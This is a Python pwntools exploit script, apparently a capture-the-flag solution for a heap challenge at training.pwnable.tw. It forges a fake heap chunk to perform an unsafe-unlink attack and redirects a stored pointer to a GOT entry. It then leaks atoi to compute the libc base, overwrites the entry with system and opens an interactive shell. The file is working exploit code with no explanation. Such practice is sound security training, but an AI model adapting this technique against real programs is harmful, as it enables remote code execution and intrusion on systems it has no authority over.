#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

host = "training.pwnable.tw"
port = 11011


r = remote(host,port)

def additem(length,name):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(length))
    r.recvuntil(":")
    r.sendline(name)

def modify(idx,length,name):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.sendline(str(length))
    r.recvuntil(":")
    r.sendline(name)

def remove(idx):
    r.recvuntil(":")
    r.sendline("4")
    r.recvuntil(":")
    r.sendline(str(idx))

def show():
    r.recvuntil(":")
    r.sendline("1")

additem(0x40,"a"*8)
additem(0x80,"b"*8)
additem(0x40,"c"*8)
ptr = 0x6020c8
fake_chunk = p64(0) #prev_size
fake_chunk += p64(0x41) #size
fake_chunk += p64(ptr-0x18) #fd
fake_chunk += p64(ptr-0x10) #bk
fake_chunk += "c"*0x20
fake_chunk += p64(0x40)
fake_chunk += p64(0x90)
modify(0,0x80,fake_chunk)
remove(1)
payload = p64(0)*2
payload += p64(0x40) + p64(0x602068)
modify(0,0x80,payload)
show()
r.recvuntil("0 : ")
atoi = u64(r.recvuntil(":")[:6].ljust(8,"\x00"))
libc = atoi - 0x36e80
print "libc:",hex(libc)
system = libc + 0x45390
modify(0,0x8,p64(system))
r.recvuntil(":")
r.sendline("sh")
r.interactive()
